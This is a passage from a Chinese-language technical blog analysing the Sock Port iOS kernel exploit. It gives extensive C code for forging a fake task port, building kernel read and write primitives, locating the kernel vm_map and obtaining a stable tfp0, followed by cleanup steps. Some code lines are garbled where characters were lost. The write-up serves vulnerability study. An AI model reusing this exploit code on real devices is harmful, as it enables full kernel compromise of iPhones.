                uint32_t receiver_name;
                uint16_t msgcount;
                uint16_t qlimit;
                uint32_t pad;
            } port;
            uint64_t klist;
        } ip_messages;
        uint64_t ip_receiver;
        uint64_t ip_kobject;
        uint64_t ip_nsrequest;
        uint64_t ip_pdrequest;
        uint64_t ip_requests;
        uint64_t ip_premsg;
        uint64_t ip_context;
        uint32_t ip_flags;
        uint32_t ip_mscount;
        uint32_t ip_srights;
        uint32_t ip_sorights;
    } kport_t;
我们要做的，是将这个`Fake Task
Port`的地址，替换到刚才被释放的内核缓冲区`pipe_buffer`里，这样整个内核缓冲区的布局就是：第一个`8`字节是我们`Fake Task
Port`的地址，后面都是正常Port的地址
先获取`Fake Task Port`的地址`port_pipe_buffer`，也就是`port_fds`对应的内核缓冲区
    uint64_t port_fg_data = 0;
    uint64_t port_pipe_buffer = 0;
    if (SMAP) {
        fproc = rk64_check(fd_ofiles + port_fds[0] * 8);
        f_fglob = rk64_check(fproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
        port_fg_data = rk64_check(f_fglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
        port_pipe_buffer = rk64_check(port_fg_data + koffset(KSTRUCT_OFFSET_PIPE_BUFFER));
        printf("[*] second pipe buffer: 0x%llx\n", port_pipe_buffer);
    }
`fakeport->ip_kobject`指向的是结构体`Task`，这个结构体还没有进行初始化，到这里完成`Fake Task Port`的内存数据构造
    fakeport->ip_kobject = port_pipe_buffer + sizeof(kport_t);
将完成构造的`Fake Task Port`数据刷到内核缓冲区里
    write(port_fds[1], (void *)fakeport, sizeof(kport_t) + 0x600);
这是我们释放掉的`pipe_buffer`，将第一个`8`字节替换为`port_pipe_buffer`的地址，那么逻辑上第一个Port内核态地址指向的内核内存空间我们就可以通过`port_fds`来进行控制了
    write(fds[1], &port_pipe_buffer, 8);
获取`Fake Task Port`的用户态句柄，从`p`中读出我们发送的OOL数据，第一个元素就是我们的`Fake Task
Port`，如同用户态传到内核态会调用`CAST_MACH_NAME_TO_PORT`将用户态句柄转换为内核态地址一样，内核态传到用户态会调用`CAST_MACH_PORT_TO_NAME`将内核态地址转换为用户态句柄
    struct ool_msg *msg = malloc(0x1000);
    ret = mach_msg(&msg->hdr, MACH_RCV_MSG, 0, 0x1000, p, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    mach_port_t *received_ports = msg->ool_ports.address;
    mach_port_t our_port = received_ports[0]; // fake port!
    free(msg);
于是我们现在拥有了`Fake Task Port`的用户态句柄和内核态地址
## 8\. 填充VM_MAP
作者在这里实现了两个内核任意读的原语，我们先来分析一下它背后的取值逻辑
通过`fake_task`获取到`bsd_info`赋值给指针变量`read_addr_ptr`，宏`kr32`里重新设置指针变量`read_addr_ptr`的值，再调用函数`pid_for_task()`，这逻辑完全看不懂什么意思
    uint64_t *read_addr_ptr = (uint64_t *)((uint64_t)fake_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    #define kr32(addr, value)\
        if (SMAP) {\
            read(port_fds[0], (void *)fakeport, sizeof(kport_t) + 0x600);\
        }\
        *read_addr_ptr = addr - koffset(KSTRUCT_OFFSET_PROC_PID);\
        if (SMAP) {\
            write(port_fds[1], (void *)fakeport, sizeof(kport_t) + 0x600);\
        }\
        value = 0x0;\
        ret = pid_for_task(our_port, (int *)&value);
        uint32_t read64_tmp;
    #define kr64(addr, value)\
        kr32(addr + 0x4, read64_tmp);\
        kr32(addr, value);\
        value = value | ((uint64_t)read64_tmp  *addr
可以得出结论：获取`read_addr_ptr`与宏`kr32()`里设置`read_addr_ptr`的值等价于设置`task->bsd_info`为`addr
-offset_p_pid`，当调用函数`pid_for_task()`去获取PID时，就能实现任意读，在此基础上，宏`k64()`实现了`8`字节读取效果
这个内核任意读原语实现的很漂亮！
利用这个任意读原语来实现PID的遍历，先判断本Task的PID是否为`0`，如果不是就获取前一个Task，如果获取到PID为`0`，就获取VM_MAP
    uint64_t struct_task;
    kr64(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), struct_task);
    printf("[!] READING VIA FAKE PORT WORKED? 0x%llx\n", struct_task);
    uint64_t kernel_vm_map = 0;
    while (struct_task != 0) {
        uint64_t bsd_info;
        kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO), bsd_info);
        uint32_t pid;
        kr32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID), pid);
        if (pid == 0) {
            uint64_t vm_map;
            kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP), vm_map);
            kernel_vm_map = vm_map;
            break;
        }
        kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV), struct_task);
    }
    printf("[i] kernel_vm_map: 0x%llx\n", kernel_vm_map);
把获取到的VM_MAP填充到我们的`Fake Task Port`，一个东拼西凑的TFP0就拿到手了
    read(port_fds[0], (void *)fakeport, sizeof(kport_t) + 0x600);
    fake_task->lock.data = 0x0;
    fake_task->lock.type = 0x22;
    fake_task->ref_count = 100;
    fake_task->active = 1;
    fake_task->map = kernel_vm_map;
    *(uint32_t *)((uint64_t)fake_task + koffset(KSTRUCT_OFFSET_TASK_ITK_SELF)) = 1;
    if (SMAP) {
        write(port_fds[1], (void *)fakeport, sizeof(kport_t) + 0x600);
    }
初始化一个全局`tfpzero`变量
    static mach_port_t tfpzero;
    void init_kernel_memory(mach_port_t tfp0) {
        tfpzero = tfp0;
    }
    init_kernel_memory(our_port);
申请`8`字节内存，写`0x4141414141414141`，再读出来，能成功说明这个`tfpzero`是能用的
    uint64_t addr = kalloc(8);
    printf("[*] allocated: 0x%llx\n", addr);
    wk64(addr, 0x4141414141414141);
    uint64_t readb = rk64(addr);
    printf("[*] read back: 0x%llx\n", readb);
    kfree(addr, 8);
这里要补充一点：这里申请的都是内核的空间，内核空间范围如下
    #define VM_MIN_KERNEL_ADDRESS    ((vm_address_t) 0xffffffe000000000ULL)
    #define VM_MAX_KERNEL_ADDRESS    ((vm_address_t) 0xfffffff3ffffffffULL)
这几个`k*()`函数是基于`tfpzero`实现的函数
内存申请函数：`kalloc()`
    uint64_t kalloc(vm_size_t size) {
        mach_vm_address_t address = 0;
        mach_vm_allocate(tfpzero, (mach_vm_address_t *)&address, size, VM_FLAGS_ANYWHERE);
        return address;
    }
读函数：`rk32()`和`rk64()`
    uint32_t rk32(uint64_t where) {
        uint32_t out;
        kread(where, &out, sizeof(uint32_t));
        return out;
    }
    uint64_t rk64(uint64_t where) {
        uint64_t out;
        kread(where, &out, sizeof(uint64_t));
        return out;
    }
    size_t kread(uint64_t where, void *p, size_t size) {
        int rv;
        size_t offset = 0;
        while (offset  size - offset) {
                chunk = size - offset;
            }
            rv = mach_vm_read_overwrite(tfpzero, where + offset, chunk, (mach_vm_address_t)p + offset, &sz);
            offset += sz;
        }
        return offset;
    }
写函数：`wk32()`和`wk64()`
    void wk32(uint64_t where, uint32_t what) {
        uint32_t _what = what;
        kwrite(where, &_what, sizeof(uint32_t));
    }
    void wk64(uint64_t where, uint64_t what) {
        uint64_t _what = what;
        kwrite(where, &_what, sizeof(uint64_t));
    }
    size_t kwrite(uint64_t where, const void *p, size_t size) {
        int rv;
        size_t offset = 0;
        while (offset  size - offset) {
                chunk = size - offset;
            }
            rv = mach_vm_write(tfpzero, where + offset, (mach_vm_offset_t)p + offset, (int)chunk);
            offset += chunk;
        }
        return offset;
    }
内存释放函数：`kfree()`
    void kfree(mach_vm_address_t address, vm_size_t size) {
        mach_vm_deallocate(tfpzero, address, size);
    }
## 9\. 稳定的TFP0
`new_tfp0`是我们最终要使用的TFP0，函数`find_port()`也是利用上面的`tfpzero`进行读取
    mach_port_t new_tfp0 = new_port();
    uint64_t new_addr = find_port(new_tfp0, self_port_addr);
最开始分析代码的时候我们说过所有的Port都以`ipc_entry_t`的形式存在在`is_table`里，可以通过用户态Port来计算索引取出这个Port的内核态地址
    uint64_t find_port(mach_port_name_t port, uint64_t task_self) {
        uint64_t task_addr = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
        uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
        uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
        uint32_t port_index = port >> 8;    // 取索引
        const int sizeof_ipc_entry_t = 0x18;
        uint64_t port_addr = rk64(is_table + (port_index * sizeof_ipc_entry_t));
        return port_addr;
    }
重新申请一片内核内存用于存储`Fake Task`，通过函数`kwrite()`将`fake_task`写到新申请的内核内存空间，然后让`Fake Task
Port`的`ip_kobject`指向这片新的内存，最后通过刷新`new_addr`指向的`new_tfp0`内存来获取一个最终的TFP0
    uint64_t faketask = kalloc(0x600);
    kwrite(faketask, fake_task, 0x600);
    fakeport->ip_kobject = faketask;
    kwrite(new_addr, (const void*)fakeport, sizeof(kport_t));
重复一遍上面的写入读取，测试这个`new_tfp0`是否可用
    init_kernel_memory(new_tfp0);
    printf("[+] tfp0: 0x%x\n", new_tfp0);
    addr = kalloc(8);
    printf("[*] allocated: 0x%llx\n", addr);
    wk64(addr, 0x4141414141414141);
    readb = rk64(addr);
    printf("[*] read back: 0x%llx\n", readb);
    kfree(addr, 8);
效果蛮好
    [+] tfp0: 0x6203
    [*] allocated: 0xfffffff008e1f000
    [*] read back: 0x4141414141414141
## 10\. 清理内存环境
从`is_table`中删除东拼西凑的Port，然后删除`fds`对应的内核缓冲区，它早就被释放了，还有一些管道句柄，IOSurface都关掉
    // 获取is_table
    uint64_t task_addr = rk64(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    // 获取索引
    uint32_t port_index = our_port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    // 清空
    wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, 0);
    wk64(is_table + (port_index * sizeof_ipc_entry_t), 0);
    // 这个pipe_buffer已经释放，这里指针也要清空
    wk64(fg_data + koffset(KSTRUCT_OFFSET_PIPE_BUFFER), 0); // freed already via mach_msg()
    if (fds[0] > 0)  close(fds[0]);
    if (fds[1] > 0)  close(fds[1]);
    if (port_fds[0] > 0)  close(port_fds[0]);
    if (port_fds[1] > 0)  close(port_fds[1]);
    free((void *)fakeport);
    deinit_IOSurface();
    return new_tfp0;
## 11\. 总结
这篇文章只能说是讲了个大概，很多细节都没有深究，比如堆分配机制，哪些是统一实现的，哪些是单独实现的，结构体偏移计算，伪造Port时各种结构体成员以什么数据进行赋值…，这些问题我也一知半解的，所以就留着后面漏洞分析的多了，逐渐补齐
## References
  1. [Sock Port 漏洞解析（一）UAF 与 Heap Spraying](http://blog.asm.im/2019/11/17/Sock-Port-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89UAF-%E4%B8%8E-Heap-Spraying/)
  2. [Sock Port 漏洞解析（二）通过 Mach OOL Message 泄露 Port Address](http://blog.asm.im/2019/11/24/Sock-Port-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89%E9%80%9A%E8%BF%87-Mach-OOL-Message-%E6%B3%84%E9%9C%B2-Port-Address/)
  3. [Sock Port 漏洞解析（三）IOSurface Heap Spraying](http://blog.asm.im/2019/12/01/Sock-Port-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%EF%BC%88%E4%B8%89%EF%BC%89IOSurface-Heap-Spraying/)
  4. [Sock Port 漏洞解析（四）The tfp0 !](http://blog.asm.im/2019/12/08/Sock-Port-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%EF%BC%88%E5%9B%9B%EF%BC%89The-tfp0/)
  5. [iOS12-2 越狱漏洞分析](https://cloud.tencent.com/developer/article/1475737)
  6. 
  7. 
  8. [Pegasus内核漏洞及PoC分析](http://4ch12dy.site/2017/05/01/Pegasus%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%8F%8APoC%E5%88%86%E6%9E%90/Pegasus%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%8F%8APoC%E5%88%86%E6%9E%90/)
  9. [pegasus分析](https://www.dazhuanlan.com/2019/12/14/5df3cd57766c5/)
  10. [iOSurfaceRootUserClient Port UAF](http://open.appscan.io/article-1216.html)
  11. [Recreating an iOS 0-day jailbreak out of Apple’s security patches](https://gsec.hitb.org/materials/sg2019/D2%20-%20Recreating%20an%20iOS%200day%20Jailbreak%20Out%20of%20Apple%E2%80%99s%20Security%20Updates%20-%20Stefan%20Esser.pdf)